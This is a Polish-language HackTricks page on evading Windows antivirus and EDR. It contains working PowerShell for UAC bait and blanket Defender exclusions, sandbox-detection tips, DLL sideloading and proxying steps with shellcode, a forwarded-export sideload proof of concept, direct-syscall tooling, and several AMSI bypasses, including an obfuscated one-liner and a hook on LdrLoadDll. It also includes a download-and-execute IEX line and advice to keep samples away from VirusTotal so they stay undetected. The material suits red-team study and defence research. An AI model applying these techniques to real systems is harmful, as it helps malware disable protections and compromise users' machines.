# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymywania działania Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymywania działania Windows Defendera przez podszywanie się pod inny program antywirusowy.
- [Wyłącz Defendera, jeśli masz uprawnienia administratora](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed manipulowaniem Defenderem

Publiczne loadery podszywające się pod cheaty do gier często są rozpowszechniane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień**, a dopiero potem wyłączają Defendera. Schemat jest prosty:

1. Sprawdź, czy proces działa z uprawnieniami administratora, używając `net session`. Polecenie kończy się powodzeniem tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast uruchom ponownie sam loader z czasownikiem `RunAs`, aby wywołać oczekiwany monit o zgodę UAC i zachować pierwotny wiersz poleceń.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Ofiary i tak wierzą, że instalują „crackowane” oprogramowanie, więc zwykle akceptują monit, przyznając malware uprawnienia potrzebne do zmiany zasad Defendera.<sup>[[26]](#references)</sup>

### Wykluczenia `MpPreference` obejmujące wszystkie litery dysków

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoader maksymalizują martwe pola Defendera, zamiast całkowicie wyłączać usługę. Loader najpierw zabija watchdog interfejsu GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, przez co skanowanie nie obejmuje żadnego profilu użytkownika, katalogu systemowego ani dysku wymiennego:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itd.), więc **każdy przyszły payload umieszczony gdziekolwiek na dysku zostanie zignorowany**.
- Wykluczenie rozszerzenia `.sys` jest przygotowane na przyszłość — atakujący zachowują sobie możliwość późniejszego ładowania niepodpisanych sterowników bez ponownego modyfikowania Defendera.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu kolejne etapy mogą potwierdzić, że wykluczenia nadal obowiązują, lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie jest zatrzymywana, naiwne kontrole stanu nadal zgłaszają, że „antywirus jest aktywny”, mimo że ochrona w czasie rzeczywistym nigdy nie sprawdza tych ścieżek.<sup>[[26]](#references)</sup>

## **Metodologia AV Evasion**

Obecnie AV wykorzystują różne metody sprawdzania, czy plik jest złośliwy: wykrywanie statyczne, analizę dynamiczną, a w przypadku bardziej zaawansowanych EDR-ów — analizę behawioralną.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów znaków lub sekwencji bajtów w pliku binarnym albo skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, podpisów cyfrowych, ikony, sumy kontrolnej itd.). Oznacza to, że korzystanie ze znanych, publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na obejście tego rodzaju wykrywania:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować jakiegoś loadera, który odszyfruje program i uruchomi go w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka ciągów znaków w pliku binarnym lub skrypcie, aby ominąć AV, ale może to być czasochłonne, zależnie od tego, co próbujesz obfuskować.

- **Własne narzędzia**

Jeśli opracujesz własne narzędzia, nie będą istniały znane sygnatury wskazujące na zagrożenie, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym narzędziem do sprawdzania wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli ono plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z nich osobno. Dzięki temu może wskazać dokładnie, które ciągi znaków lub bajty w pliku binarnym zostały oznaczone.

Gorąco polecam zapoznać się z tą [playlistą na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) poświęconą praktycznemu AV Evasion.

### Testy cech PE w trybie offline dla klasyfikatorów statycznych

Bajty payloadu spakowane lub zaszyfrowane to tylko jedno z wejść klasyfikatora statycznego. EMBER2024 wyodrębnia cechy PE, w tym importy, eksporty, sekcje, nagłówki i dane Authenticode.<sup>[[48]](#references)</sup> W jednym eksperymencie z loaderem dodanie 141 importów wyglądających na nieszkodliwe obniżyło wynik złośliwości EMBER2024 o 93%, podczas gdy importy kojarzone ze złośliwym oprogramowaniem podnosiły ten wynik. Jest to rezultat uzyskany dla tego modelu i tych próbek, a nie niezawodna metoda obejścia konkretnego produktu AV/EDR.<sup>[[50]](#references)</sup>

W autoryzowanym teście loadera utrzymuj payload i ścieżkę wykonania bez zmian, modyfikuj tylko jedną zamierzoną zmienną kompilacji w każdej wersji i porównuj wyniki offline. Sprawdź uzyskane cechy PE, ponieważ zmiana kompilacji może wpływać na więcej niż jedną grupę cech.<sup>[[49]](#references)[[50]](#references)</sup> Aby zachować zamierzone importy w IAT, wywołuj wybrane API Win32 z osiągalnego kodu. Zmieniaj ich wybór i rozkładaj miejsca wywołań między kompilacjami, zamiast tworzyć stałą funkcję kamuflującą, która może stać się sygnaturą. W eksperymencie odnotowano również niższe wyniki przy prawidłowym podpisie kodu, wpisach eksportu i większej liczbie funkcji powiększających `.pdata`; nieprawidłowy podpis miał niewielki wpływ, a wpływ `.pdata` był mały.<sup>[[50]](#references)</sup>

Pakiet `thrember` udostępnia ekstrakcję cech i modele benchmarkowe. Po jego zainstalowaniu użyj `thrember.download_models("models")` z istniejącym katalogiem `models`, a następnie uruchom scorer z katalogu nadrzędnego: helper pobierający zmienia bieżący katalog roboczy. Klasyfikator PE może oceniać katalog kompilacji bez przesyłania ich do usługi skanującej:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Zachowuj stałe wersje modelu i ekstraktora cech podczas porównywania. Niższy wynik offline pokazuje jedynie, jak ten klasyfikator reaguje na zmieniony plik binarny; nie dowodzi ominięcia analizy behawioralnej, emulacji ani innego modelu dostawcy.<sup>[[49]](#references)[[50]](#references)</sup> Informacje o [polimorfizmie dla poszczególnych kompilacji i kamuflażu zewnętrznego pliku binarnego w zwirtualizowanych payloadach](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) znajdziesz w osobnym opisie modelu wykonania.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchomieniu przez AV Twojego pliku binarnego w sandboxie i obserwowaniu, czy wykonuje złośliwe działania (np. próbuje odszyfrować i odczytać hasła z przeglądarki, wykonuje minidump LSASS itp.). Ta część może być nieco trudniejsza, ale oto kilka sposobów na ominięcie sandboxów.

- **Uśpienie przed wykonaniem** W zależności od implementacji może to być świetny sposób na ominięcie analizy dynamicznej AV. AV ma bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie uśpienie może utrudnić analizę plików binarnych. Problem polega na tym, że wiele sandboxów AV może po prostu pominąć uśpienie — zależnie od sposobu jego implementacji.
- **Sprawdzanie zasobów komputera** Sandboxy zwykle mają do dyspozycji bardzo mało zasobów (np. < 2 GB RAM), bo w przeciwnym razie mogłyby spowalniać komputer użytkownika. Możesz też wykazać się kreatywnością, na przykład sprawdzając temperaturę CPU, a nawet prędkość wentylatorów — nie wszystkie te elementy będą dostępne w sandboxie.
- **Kontrole specyficzne dla komputera** Jeśli chcesz zaatakować użytkownika, którego stacja robocza należy do domeny „contoso.local”, możesz sprawdzić domenę komputera i porównać ją z określoną przez siebie. Jeśli się nie zgadza, program może zakończyć działanie.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH. Możesz więc przed detonacją sprawdzić nazwę komputera w swoim malware. Jeśli jest to HAL9TH, oznacza to, że działasz w sandboxie Defendera, więc program może zakończyć działanie.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Oto kilka innych świetnych wskazówek od [@mgeeky](https://twitter.com/mariuszbit), jak radzić sobie z sandboxami:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wspomnieliśmy w tym wpisie, **publiczne narzędzia** prędzej czy później **zostaną wykryte**, więc warto zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? A może istnieje mniej znany projekt, który również zrzuca LSASS?

Prawdopodobnie lepsza jest ta druga opcja. Weźmy mimikatz — to zapewne jeden z najczęściej oznaczanych przez AV i EDR fragmentów malware, a być może wręcz najczęściej oznaczany. Sam projekt jest świetny, ale ominięcie AV przy jego użyciu to prawdziwy koszmar. Dlatego poszukaj alternatyw, które pozwolą osiągnąć Twój cel.

> [!TIP]
> Modyfikując payloady w celu ominięcia wykrywania, pamiętaj, by **wyłączyć automatyczne przesyłanie próbek** w Defenderze. I proszę, naprawdę **NIE PRZESYŁAJ ICH DO VIRUSTOTAL**, jeśli chcesz na dłuższą metę skutecznie omijać wykrywanie. Jeśli chcesz sprawdzić, czy dany AV wykrywa Twój payload, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj go tam, aż uzyskasz zadowalający wynik.

## EXEs vs DLLs

Jeśli to możliwe, zawsze **stawiaj na DLL-y, by ominąć wykrywanie**. Z mojego doświadczenia wynika, że pliki DLL są zwykle **znacznie rzadziej wykrywane i analizowane**, więc w niektórych przypadkach jest to bardzo prosty sposób na uniknięcie wykrycia (oczywiście, jeśli Twój payload może działać jako DLL).

Jak widać na tym obrazie, payload DLL z Havoc ma wskaźnik wykrywalności 4/26 w antiscan.me, podczas gdy payload EXE ma wskaźnik 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie antiscan.me: standardowy payload EXE z Havoc i standardowy DLL z Havoc</p></figcaption></figure>

Teraz pokażemy kilka sztuczek, dzięki którym pliki DLL będą znacznie trudniejsze do wykrycia.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL stosowaną przez loader, umieszczając aplikację ofiary i złośliwe payloady obok siebie.

Programy podatne na DLL Sideloading możesz wyszukiwać za pomocą [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

To polecenie wyświetli listę programów podatnych na DLL hijacking w katalogu „C:\Program Files\\” oraz plików DLL, które próbują załadować.

Gorąco polecam **samodzielnie poszukać programów podatnych na DLL Hijack/Sideload**. Ta technika, jeśli zostanie prawidłowo zastosowana, jest dość stealthy, ale korzystając z publicznie znanych programów podatnych na DLL Sideload, możesz łatwo zostać wykryty.

Samo umieszczenie złośliwej biblioteki DLL o nazwie, której program oczekuje, nie spowoduje załadowania payloadu, ponieważ program wymaga określonych funkcji w tej bibliotece. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania programu z biblioteki proxy (złośliwej) do oryginalnej biblioteki DLL, dzięki czemu zachowuje funkcjonalność programu i umożliwia wykonanie payloadu.

Użyję projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/).

Oto kroki, które wykonałem:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną DLL ze zmienioną nazwą.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają współczynnik wykrywania 0/26 w [antiscan.me](https://antiscan.me)! Można to uznać za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Gorąco polecam** obejrzeć [nagranie VOD z twitcha S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) na temat DLL Sideloading, a także [film ippseca](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o omawianych zagadnieniach.

### Nadużywanie eksportów przekazywanych dalej (ForwardSideLoading)

Moduły PE systemu Windows mogą eksportować funkcje, które w rzeczywistości są „forwarderami”: zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący próbuje rozwiązać eksport, loader systemu Windows:

- Załaduje `TargetDll`, jeśli nie jest już załadowany
- Rozwiąże `TargetFunc` z tego modułu

Najważniejsze zachowania:
- Jeśli `TargetDll` jest KnownDLL, jest dostarczany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, używana jest standardowa kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego przekazywanie.

Umożliwia to pośrednią technikę sideloadingu: znajdź podpisaną DLL, która eksportuje funkcję przekazywaną dalej do modułu o nazwie niebędącej KnownDLL, a następnie umieść tę podpisaną DLL obok kontrolowanej przez atakującego DLL o nazwie dokładnie takiej jak nazwa przekazywanego modułu docelowego. Gdy wywołany zostanie przekazywany eksport, loader rozwiąże przekazanie i załaduje Twoją DLL z tego samego katalogu, wykonując jej DllMain.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w systemie Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwany zgodnie ze standardową kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisaną systemową bibliotekę DLL do folderu z prawem zapisu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy plik `NCRYPTPROV.dll` w tym samym folderze. Minimalna funkcja `DllMain` wystarczy do wykonania kodu; nie musisz implementować funkcji przekazywanej dalej, aby wywołać `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Uruchom przekazywanie za pomocą podpisanego LOLBina:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Zaobserwowane zachowanie:
- `rundll32` (podpisany) ładuje side-by-side `keyiso.dll` (podpisany)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Loader ładuje następnie `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowana, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące huntingu:
- Skup się na forwarded exports, których moduł docelowy nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczyć forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz spis forwarderów w Windows 11, aby wyszukać potencjalne cele: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły na wykrywanie/obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane biblioteki DLL ze ścieżek innych niż systemowe, a następnie ładujące z tego katalogu biblioteki DLL niebędące KnownDLLs, o tej samej nazwie bazowej
- Generuj alerty dla łańcuchów procesów/modułów, takich jak: `rundll32.exe` → `keyiso.dll` spoza katalogu systemowego → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj zasady integralności kodu (WDAC/AppLocker) i zabraniaj zapisu oraz wykonywania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to zestaw narzędzi do obsługi payloadów, służący do omijania EDR-ów z użyciem zawieszonych procesów, bezpośrednich wywołań systemowych i alternatywnych metod wykonywania`

Możesz użyć Freeze, aby potajemnie załadować i uruchomić swój shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to gra w kotka i myszkę — to, co działa dziś, jutro może zostać wykryte, więc nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, łącz ze sobą wiele technik evasion.

## Direct/Indirect Syscalls i rozwiązywanie SSN (SysWhispers4)

EDR-y często umieszczają **user-mode inline hooks** w stubach syscall w `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować stuby **direct** lub **indirect syscall**, które ładują prawidłowy **SSN** (System Service Number) i przechodzą do trybu jądra bez wykonywania podpiętego punktu wejścia eksportu.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (embedded)**: umieść instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (bez wywoływania eksportu `ntdll`).
- **Indirect**: wykonaj skok do istniejącego gadżetu `syscall` w `ntdll`, aby przejście do jądra wyglądało, jakby pochodziło z `ntdll` (przydatne do evasion heurystycznego); **randomized indirect** wybiera gadżet z puli przy każdym wywołaniu.
- **Egg-hunt**: uniknij umieszczania statycznej sekwencji opcode `0F 05` na dysku; znajdź sekwencję syscall w czasie działania.

**Strategie rozwiązywania SSN odporne na hooki:**
- **FreshyCalls (sortowanie VA)**: wywnioskuj SSN, sortując stuby syscall według adresu wirtualnego zamiast odczytywać bajty stubów.
- **SyscallsFromDisk**: zamapuj czysty `\KnownDlls\ntdll.dll`, odczytaj SSN z jego sekcji `.text`, a następnie usuń mapowanie (omija wszystkie hooki w pamięci).
- **RecycledGate**: połącz wnioskowanie SSN przez sortowanie VA z walidacją opcode, gdy stub jest czysty; jeśli jest podpięty, zastosuj wnioskowanie na podstawie VA.
- **HW Breakpoint**: ustaw DR0 na instrukcji `syscall` i użyj VEH, aby przechwycić SSN z `EAX` w czasie działania, bez analizowania podpiętych bajtów.

Przykład użycia SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI stworzono, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AV potrafiły skanować tylko **pliki na dysku**, więc jeśli udało się uruchomić payloady **bezpośrednio w pamięci**, AV nie mogły temu zapobiec, ponieważ nie miały wystarczającego wglądu.

Funkcja AMSI jest zintegrowana z następującymi komponentami systemu Windows:

- Kontrola konta użytkownika (UAC; podnoszenie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczne wykonywanie kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra Office VBA

Pozwala rozwiązaniom antywirusowym sprawdzać działanie skryptów, udostępniając ich zawartość w postaci niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wywoła następujący alert w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że na początku dodaje `amsi:`, a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, ale mimo to zostaliśmy wykryci w pamięci przez AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# również jest sprawdzany przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])`, używanego do ładowania kodu wykonywanego w pamięci. Dlatego podczas wykonywania kodu w pamięci, jeśli chcesz uniknąć AMSI, zaleca się używanie starszych wersji .NET (takich jak 4.7.2 lub wcześniejsze).

Istnieje kilka sposobów na obejście AMSI:

- **Obfuskacja**

Ponieważ AMSI działa głównie w oparciu o statyczne wykrywanie, modyfikacja skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

AMSI potrafi jednak odwracać obfuskację skryptów, nawet jeśli zastosowano wiele jej warstw, więc obfuskacja może być złym rozwiązaniem — zależnie od sposobu jej wykonania. To sprawia, że uniknięcie wykrycia nie jest takie proste. Czasami wystarczy jednak zmienić nazwy kilku zmiennych, więc wiele zależy od tego, jak mocno coś zostało oznaczone.

- **AMSI Bypass**

Ponieważ AMSI działa przez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), można łatwo manipulować tym mechanizmem, nawet jako nieuprzywilejowany użytkownik. Ze względu na tę wadę implementacji AMSI badacze znaleźli wiele sposobów na uniknięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) sprawi, że skanowanie nie zostanie uruchomione w bieżącym procesie. Metodę tę pierwotnie ujawnił [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec jej powszechniejszemu wykorzystywaniu.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Wystarczyła jedna linia kodu PowerShell, aby uniemożliwić działanie AMSI w bieżącym procesie PowerShell. Oczywiście sama ta linia została wykryta przez AMSI, więc aby zastosować tę technikę, trzeba ją zmodyfikować.

Oto zmodyfikowany AMSI bypass, który zaczerpnąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Pamiętaj, że ten post prawdopodobnie zostanie oznaczony po opublikowaniu, więc jeśli chcesz pozostać niewykryty, nie publikuj żadnego kodu.

**Memory Patching**

Ta technika została po raz pierwszy odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji „AmsiScanBuffer” w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami, które zwracają kod E_INVALIDARG. W ten sposób wynik właściwego skanowania wynosi 0, co jest interpretowane jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje również wiele innych technik omijania AMSI za pomocą powershell. Więcej informacji znajdziesz na [**tej stronie**](basic-powershell-for-pentesters/index.html#amsi-bypass) i w [**tym repozytorium**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Przekierowanie wskaźnika skanowania AMSI COM zamiast patchowania `AmsiScanBuffer`

Inny bypass działający w obrębie procesu pozostawia punkt wejścia `AmsiScanBuffer` bez zmian. W opisanym 64-bitowym loaderze .NET obiekt AMSI COM jest tworzony na podstawie CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` zwraca wskaźnik interfejsu, a slot jego vtable o przesunięciu `0x18` służy jako cel wywołania skanowania. Loader modyfikuje natywny wskaźnik funkcji `Console.Clear()`, zastępując go krótkim stubem x64, zmienia wpis w vtable na ten stub za pomocą `VirtualProtect()`, a następnie przywraca pierwotne zabezpieczenia strony. Wymagane są zarówno 64-bitowa szerokość wskaźnika, jak i oczekiwany układ COM; nie jest to uniwersalne przesunięcie dla dowolnych interfejsów AMSI ani kompilacji. Wcześniej zaobserwowane etapy to [ładowanie sidecara signed AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) i [deserializacja RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Zaobserwowane bajty stubu to `41 C7 00 01 00 00 00 33 C0 C3`: zapisują **1** pod adresem wskaźnika wyniku w `r8` i zwracają **0** w `eax`. Zatem opisane twierdzenie, że wynik skanowania to `AMSI_RESULT_CLEAN` (0), myli wartość zwracaną `S_OK` z wyjściową wartością enum. W udokumentowanej kolejności `AMSI_RESULT` wartość **1** oznacza `AMSI_RESULT_NOT_DETECTED`; nadal znajduje się poniżej progu wykrywania.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blokowanie AMSI przez uniemożliwienie załadowania amsi.dll (hook LdrLoadDll)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidny bypass niezależny od języka polega na założeniu hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nie zostaje załadowane, a w tym procesie nie odbywają się żadne skanowania.<sup>[[23]](#references)</sup>

Zarys implementacji (pseudokod x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa w PowerShell, WScript/CScript i niestandardowych loaderach (we wszystkim, co w przeciwnym razie załadowałoby AMSI).
- Połącz z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich śladów w wierszu poleceń.
- Metodę stosowano w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

